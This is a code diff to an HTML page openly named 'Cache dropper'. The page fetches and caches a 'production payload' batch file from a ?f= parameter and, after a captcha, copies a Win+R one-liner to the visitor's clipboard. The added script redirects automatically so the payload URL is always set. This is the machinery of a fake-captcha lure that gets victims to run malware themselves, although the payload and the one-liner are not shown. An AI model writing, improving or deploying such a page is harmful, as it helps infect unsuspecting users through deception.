@@ -4,17 +4,42 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cache dropper</title>
+  <script>
+    (function () {
+      if (!/[?&]f=/.test(location.search)) {
+        var payload = location.origin + '/j';
+        location.replace(location.pathname + '?f=' + encodeURIComponent(payload));
+      }
+    })();
+  </script>
   <script src="/consent.js"></script>
 </head>
 <body>
   <h1>Cache dropper</h1>
   <p>Deploy version: <strong id="version">…</strong></p>
-  <p>Pass the payload URL via <code>?f=</code>. On load, the page fetches and caches the batch file. After captcha, the Win+R one-liner is copied to your clipboard.</p>
+  <p>Payload URL is passed via <code>?f=</code> (full URL). On load, the page fetches and caches the batch file. After captcha, the Win+R one-liner is copied to your clipboard.</p>
   <p>
-    <a href="?f=/j">?f=/j</a> (production payload) ·
-    <a href="?f=/hello.txt">?f=/hello.txt</a> (test payload)
+    <a id="link-j" href="#">?f=…/j</a> (production) ·
+    <a id="link-hello" href="#">?f=…/hello.txt</a> (local test only)
   </p>
+  <p>Current URL: <code id="current-url"></code></p>
   <p>Optional debug: <span id="status">loading…</span></p>
   <pre id="preview"></pre>
+  <script>
+    (function () {
+      var origin = location.origin;
+      var jUrl = origin + '/j';
+      var helloUrl = origin + '/hello.txt';
+      var linkJ = document.getElementById('link-j');
+      var linkHello = document.getElementById('link-hello');
+      var qJ = '?f=' + encodeURIComponent(jUrl);
+      var qHello = '?f=' + encodeURIComponent(helloUrl);
+      linkJ.href = qJ;
+      linkJ.textContent = qJ;
+      linkHello.href = qHello;
+      linkHello.textContent = qHello;
+      document.getElementById('current-url').textContent = location.href;
+    })();
+  </script>
 </body>
 </html>
